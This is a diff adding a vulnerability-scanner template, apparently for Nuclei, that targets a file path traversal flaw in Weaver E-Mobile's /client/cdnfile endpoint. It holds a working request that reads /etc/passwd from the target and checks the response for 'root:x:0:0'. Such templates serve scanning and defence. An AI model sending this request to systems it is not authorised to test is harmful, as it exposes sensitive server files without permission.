@@ -1,0 +1,25 @@
+id: weaver-e-mobile-file-read
+
+info:
+  name: "泛微 E-Mobile cdnfile 接口文件路径遍历漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    泛微E-Mobile是由上海泛微网络科技股份有限公司开发的移动办公解决方案，支持移动端设备的办公需求。在/client/cdnfile接口中存在文件访问控制缺陷，攻击者可通过构造恶意路径参数实现未授权的文件访问，导致服务器文件系统中的敏感数据被泄露。
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    GET /client/cdnfile/C/etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
